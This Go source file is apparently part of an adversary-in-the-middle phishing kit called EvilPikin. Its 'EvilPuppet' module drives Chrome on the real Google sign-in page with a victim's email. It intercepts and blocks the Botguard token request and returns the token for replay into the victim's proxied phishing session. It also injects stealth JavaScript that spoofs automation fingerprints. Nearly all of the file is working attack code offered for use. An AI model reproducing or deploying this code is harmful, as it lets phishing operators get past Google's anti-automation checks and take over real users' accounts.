// Package puppet implements EvilPikin's "EvilPuppet" capability: a headless
// real-browser solver that defeats client-side anti-automation challenges a
// pure HTTP reverse proxy cannot. Google's Botguard is the canonical case —
// it mints a domain-bound token that is validated against
// window.location.hostname, so a token produced on the phishing domain is
// rejected. The solver drives a real Chrome on the GENUINE origin
// (accounts.google.com), performs the step that triggers token generation,
// intercepts the resulting request, and returns the token so the engine can
// replay it into the victim's proxied request.
//
// Decoupled token generation follows the documented PoC: the /accountLookup
// request (carrying the botguard token) is generated client-side on the real
// origin, intercepted and blocked before it reaches Google, and the captured
// token is then injected into the victim's MITM session. The token is not
// bound to a browser session, only to the origin where it was generated.
package puppet

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/cdproto/fetch"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/cdproto/page"
	"github.com/chromedp/chromedp"
)

// Token is a captured challenge token ready to be replayed into a victim request.
type Token struct {
	Param string // query param name carrying the token (e.g. "bgRequest", or the renamed v3 param)
	Value string
}

// SolveRequest describes the step the solver must perform on the real origin.
type SolveRequest struct {
	RealOrigin string // genuine scheme://host, e.g. "https://accounts.google.com"
	RealPath   string // path on the real origin that drives the flow, e.g. "/"
	Field      string // form field whose value triggers token generation, e.g. "identifier"
	Value      string // the victim's value for Field, e.g. the email
	TokenParam string // preferred param name carrying the token; auto-detected if empty/renamed
	// Selectors override the default Google sign-in selectors when targeting a
	// different IdP. Empty values fall back to the Google defaults.
	InputSelector  string // e.g. `input[name="identifier"]`
	SubmitSelector string // e.g. `#identifierNext`
}

// Solver mints a valid challenge token on the real origin for replay.
type Solver interface {
	SolveToken(ctx context.Context, req SolveRequest) (*Token, error)
}

// ChromeSolver drives a Chrome via the DevTools Protocol (chromedp). It can run
// headless (default, for CI) or HEADED. Headed mode is required against targets
// like Google whose Botguard detects headless Chrome: a headed browser
// controlled over CDP is indistinguishable from a real user session and yields
// a valid token. Toggle with EVILPUPPET_HEADLESS=0 (or "false").
type ChromeSolver struct {
	execPath string
	timeout  time.Duration
	headless bool
}

// NewChromeSolver returns a Chrome-backed solver. An empty execPath triggers
// automatic discovery of a Chrome/Chromium binary on the host.
func NewChromeSolver(execPath string) *ChromeSolver {
	if execPath == "" {
		execPath = detectChrome()
	}
	headless := true
	if v := os.Getenv("EVILPUPPET_HEADLESS"); v == "0" || strings.EqualFold(v, "false") {
		headless = false
	}
	return &ChromeSolver{execPath: execPath, timeout: 30 * time.Second, headless: headless}
}

// detectChrome returns the path to an installed Chrome/Chromium, or "".
func detectChrome() string {
	candidates := []string{
		"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
		"/Applications/Chromium.app/Contents/MacOS/Chromium",
		"/usr/bin/google-chrome",
		"/usr/bin/google-chrome-stable",
		"/usr/bin/chromium",
		"/usr/bin/chromium-browser",
		"/opt/google/chrome/chrome",
		`C:\Program Files\Google\Chrome\Application\chrome.exe`,
		`C:\Program Files (x86)\Google\Chrome\Application\chrome.exe`,
	}
	for _, c := range candidates {
		if _, err := os.Stat(c); err == nil {
			return c
		}
	}
	for _, bin := range []string{"google-chrome", "chromium", "chrome", "chromium-browser"} {
		if p, err := exec.LookPath(bin); err == nil {
			return p
		}
	}
	return ""
}

// Available reports whether a Chrome binary is reachable.
func (c *ChromeSolver) Available() bool { return c.execPath != "" }

// SolveToken launches headless Chrome with stealth evasion, walks the real
// sign-in flow with the victim's value, intercepts the botguard token request
// (auto-detecting the parameter name, since Google renamed it across the v2/v3
// login transitions), blocks that request to avoid throttling, and returns the
// captured token.
func (c *ChromeSolver) SolveToken(ctx context.Context, req SolveRequest) (*Token, error) {
	if c.execPath == "" {
		return nil, fmt.Errorf("evilpuppet: no Chrome binary available")
	}
	ctx, cancel := context.WithTimeout(ctx, c.timeout)
	defer cancel()

	allocOpts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.ExecPath(c.execPath),
		chromedp.Flag("no-sandbox", true),
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("disable-dev-shm-usage", true),
		chromedp.Flag("disable-blink-features", "AutomationControlled"),
		chromedp.Flag("user-agent", desktopUA),
		chromedp.Flag("window-size", "1280,800"),
		chromedp.Flag("lang", "en-US"),
	)
	if c.headless {
		// Headed Chrome is required to defeat Botguard; only add the headless
		// flag when the operator explicitly opts in (e.g. CI without a display).
		allocOpts = append(allocOpts, chromedp.Flag("headless", "new"))
	} else {
		// A visible browser session is far less detectable. Keep it out of the
		// user's way but ensure a real window/event loop drives the page.
		allocOpts = append(allocOpts,
			chromedp.Flag("no-first-run", true),
			chromedp.Flag("no-default-browser-check", true),
		)
	}
	allocCtx, cancelAlloc := chromedp.NewExecAllocator(ctx, allocOpts...)
	defer cancelAlloc()

	runCtx, cancelRun := chromedp.NewContext(allocCtx)
	defer cancelRun()

	doneCh := make(chan struct{})
	var captured Token
	var capOnce sync.Once

	chromedp.ListenTarget(runCtx, func(ev interface{}) {
		switch e := ev.(type) {
		case *network.EventRequestWillBeSent:
			if debugPuppet() {
				if hu, herr := url.Parse(e.Request.URL); herr == nil {
					log.Printf("[evilpuppet:debug] %s %s%s", e.Request.Method, hu.Host, hu.Path)
				}
			}
		case *fetch.EventRequestPaused:
			// Abort the (headless) identifier submit so the page stays alive and
			// the botguard token field remains readable from the DOM. CDP hides
			// top-level navigation POST bodies, so we read the injected token
			// field directly instead of the network request.
			if strings.Contains(e.Request.URL, "/v3/signin/identifier") {
				_ = fetch.FailRequest(e.RequestID, network.ErrorReasonBlockedByClient).Do(runCtx)
				return
			}
			// Fallback: capture a token carried by any XHR/fetch (renamed
			// challenge endpoint) and block it to avoid throttling.
			if tok, ok := findBotguardToken(e.Request.URL, "", req.TokenParam); ok {
				capOnce.Do(func() {
					captured = tok
					close(doneCh)
				})
				_ = fetch.FailRequest(e.RequestID, network.ErrorReasonBlockedByClient).Do(runCtx)
				return
			}
			var post string
			if e.Request.Method == "POST" {
				if pd, err := network.GetRequestPostData(network.RequestID(e.RequestID)).Do(runCtx); err == nil {
					post = string(pd)
				}
			}
			if post != "" {
				if tok, ok := findBotguardToken(e.Request.URL, post, req.TokenParam); ok {
					capOnce.Do(func() {
						captured = tok
						close(doneCh)
					})
					_ = fetch.FailRequest(e.RequestID, network.ErrorReasonBlockedByClient).Do(runCtx)
					return
				}
			}
			if debugPuppet() && post != "" {
				log.Printf("[evilpuppet:debug] %s %s postData=%q", e.Request.Method, e.Request.URL, post)
			}
			_ = fetch.ContinueRequest(e.RequestID).Do(runCtx)
		}
	})

	base := strings.TrimRight(req.RealOrigin, "/")
	if req.RealPath != "" {
		base += req.RealPath
	}
	inputSel := req.InputSelector
	if inputSel == "" {
		inputSel = `input[name="` + req.Field + `"]`
	}
	submitSel := req.SubmitSelector
	if submitSel == "" {
		submitSel = `#identifierNext`
	}

	actions := []chromedp.Action{
		fetch.Enable().WithPatterns([]*fetch.RequestPattern{
			{URLPattern: "*", ResourceType: network.ResourceTypeXHR},
			{URLPattern: "*", ResourceType: network.ResourceTypeFetch},
			{URLPattern: "*/v3/signin/identifier*", ResourceType: network.ResourceTypeDocument},
		}).WithHandleAuthRequests(false),
		chromedp.ActionFunc(func(ctx context.Context) error {
			_, err := page.AddScriptToEvaluateOnNewDocument(stealthJS).Do(ctx)
			return err
		}),
		chromedp.Navigate(base),
	}
	if req.Field != "" && req.Value != "" {
		actions = append(actions,
			chromedp.WaitVisible(inputSel, chromedp.ByQuery),
			chromedp.SendKeys(inputSel, req.Value, chromedp.ByQuery),
			chromedp.Click(submitSel, chromedp.ByQuery),
		)
	}
	// After the (aborted) submit, poll the form DOM for the botguard token that
	// Google's JS injected as a hidden field, then signal capture. This avoids
	// relying on CDP post-body interception (unavailable for top-level nav).
	actions = append(actions, chromedp.ActionFunc(func(ctx context.Context) error {
		first := true
		for {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}
			if first && debugPuppet() {
				var dump string
				if chromedp.Evaluate(dumpFormJS, &dump).Do(ctx) == nil {
					log.Printf("[evilpuppet:debug:form] %s", dump)
				}
			}
			first = false
			var res string
			if err := chromedp.Evaluate(extractTokenJS, &res).Do(ctx); err == nil && res != "" && res != "null" {
				var tv struct {
					Param string `json:"param"`
					Value string `json:"value"`
				}
				if json.Unmarshal([]byte(res), &tv) == nil && tv.Value != "" {
					capOnce.Do(func() {
						captured = Token{Param: tv.Param, Value: tv.Value}
						close(doneCh)
					})
					return nil
				}
			}
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(300 * time.Millisecond):
			}
		}
	}))

	_ = chromedp.Run(runCtx, actions...)

	select {
	case <-doneCh:
		return &captured, nil
	case <-ctx.Done():
		return nil, fmt.Errorf("evilpuppet: no botguard token observed on %s (param=%s): %w", base, req.TokenParam, ctx.Err())
	}
}

// findBotguardToken inspects a paused request (URL + POST body) for the
// botguard token. It prefers req.TokenParam, then known historical names, then
// auto-detects any param/field whose value is token-shaped. This matters because
// Google renamed the parameter across login versions (v2 "bgRequest" -> v3
// renamed) and may now carry it in the POST body of the sign-in RPC rather than
// a query string, so a query-only hard match silently fails.
func findBotguardToken(rawURL, postData, wantParam string) (Token, bool) {
	pairs := map[string]string{}
	if u, err := url.Parse(rawURL); err == nil {
		for k, vs := range u.Query() {
			pairs[k] = vs[0]
		}
	}
	if postData != "" {
		if pd, err := url.ParseQuery(postData); err == nil {
			for k, vs := range pd {
				pairs[k] = vs[0]
			}
		}
	}
	blob := rawURL + "\n" + postData
	for _, re := range keyValRes {
		for _, m := range re.FindAllStringSubmatch(blob, -1) {
			if tokenLike(m[2]) {
				pairs[m[1]] = m[2]
			}
		}
	}
	if wantParam != "" && tokenLike(pairs[wantParam]) {
		return Token{Param: wantParam, Value: pairs[wantParam]}, true
	}
	for _, name := range []string{"bgRequest", "bg", "botguard", "bgreq"} {
		if tokenLike(pairs[name]) {
			return Token{Param: name, Value: pairs[name]}, true
		}
	}
	for k, v := range pairs {
		if tokenLike(v) {
			return Token{Param: k, Value: v}, true
		}
	}
	return Token{}, false
}

var (
	tokenShape = regexp.MustCompile(`^[A-Za-z0-9._~-]{60,}$`)
	// form-encoded and JSON key/value pairs whose value is token-shaped.
	keyValRes = []*regexp.Regexp{
		regexp.MustCompile(`([A-Za-z0-9_.\[\]]+)=([A-Za-z0-9_-]{60,})`),
		regexp.MustCompile(`"([A-Za-z0-9_.]+)"\s*:\s*"([A-Za-z0-9_-]{60,})"`),
	}
)

// tokenLike reports whether s looks like a botguard token: a long base64url
// string. Plain query values (URLs, "1", UUIDs) fail the length/charset test.
func tokenLike(s string) bool {
	if len(s) < 60 {
		return false
	}
	return tokenShape.MatchString(s)
}

// debugPuppet reports whether verbose interception logging is enabled.
func debugPuppet() bool {
	return os.Getenv("EVILPUPPET_DEBUG") != ""
}

// stealthJS patches automation fingerprints before page scripts run.
var stealthJS = `(function(){
  try { Object.defineProperty(navigator, 'webdriver', { get: function(){ return undefined; } }); } catch(e){}
  try {
    Object.defineProperty(navigator, 'plugins', { get: function(){ return [
      { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
      { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojklgcpolglnbgl', description: 'PDF Viewer' },
      { name: 'Native Client', filename: 'nacl_plugin', description: 'Native Client' }
    ]; } }); } catch(e){}
  try {
    Object.defineProperty(navigator, 'mimeTypes', { get: function(){ return {
      0: { type: 'application/pdf', suffixes: 'pdf', description: 'Portable Document Format' }, length: 1
    }; } }); } catch(e){}
  try { Object.defineProperty(navigator, 'languages', { get: function(){ return ['en-US','en']; } }); } catch(e){}
  try { Object.defineProperty(navigator, 'platform', { get: function(){ return 'MacIntel'; } }); } catch(e){}
  try {
    var orig = navigator.permissions.query.bind(navigator.permissions);
    navigator.permissions.query = function(p){ return (p && p.name === 'notifications') ? Promise.resolve({ state: (window.Notification?Notification.permission:'default') }) : orig(p); };
  } catch(e){}
  try { window.chrome = { runtime: {}, app: { isInstalled: false, InstallState: {}, RunningState: {} }, webstore: {} }; } catch(e){}
})();`

// desktopUA is a realistic macOS Chrome UA so the headless session does not
// announce an obviously automated user-agent.
const desktopUA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

// extractTokenJS reads the botguard token Google's JS injected into the sign-in
// form as a hidden field (or any input on the page) before the native submit.
// It returns JSON {"param":name,"value":token} or null.
var extractTokenJS = `(function(){
  function tok(s){ return s && s.length >= 60 && /^[A-Za-z0-9_-]+$/.test(s); }
  var f = document.querySelector('form');
  if (f) {
    var els = f.elements;
    for (var i = 0; i < els.length; i++) {
      var v = els[i].value || '';
      if (tok(v)) return JSON.stringify({param: els[i].name || els[i].id || '', value: v});
    }
  }
  var ins = document.querySelectorAll('input');
  for (var j = 0; j < ins.length; j++) {
    var iv = ins[j].value || '';
    if (tok(iv)) return JSON.stringify({param: ins[j].name || ins[j].id || '', value: iv});
  }
  return null;
})();`

// dumpFormJS returns a JSON array of "name=valuelen" for every form field, used
// only for diagnostics (EVILPUPPET_DEBUG) to learn the token field's name/shape.
var dumpFormJS = `(function(){
  var out = [];
  var els = document.querySelectorAll('input,textarea');
  for (var i = 0; i < els.length; i++) {
    var el = els[i];
    var v = el.value || '';
    out.push((el.name || el.id || ('?' + i)) + '=' + v.length + (v.length >= 40 ? ':' + v.substring(0, 24) + '...' : ''));
  }
  return JSON.stringify(out);
})();`

// MockSolver is a deterministic solver for tests and dry-runs.
type MockSolver struct {
	Token *Token
}

// SolveToken returns the preset token (or a default one) without launching a browser.
func (m *MockSolver) SolveToken(ctx context.Context, req SolveRequest) (*Token, error) {
	if m.Token != nil {
		return m.Token, nil
	}
	param := req.TokenParam
	if param == "" {
		param = "bgRequest"
	}
	return &Token{Param: param, Value: "MOCK_" + param}, nil
}
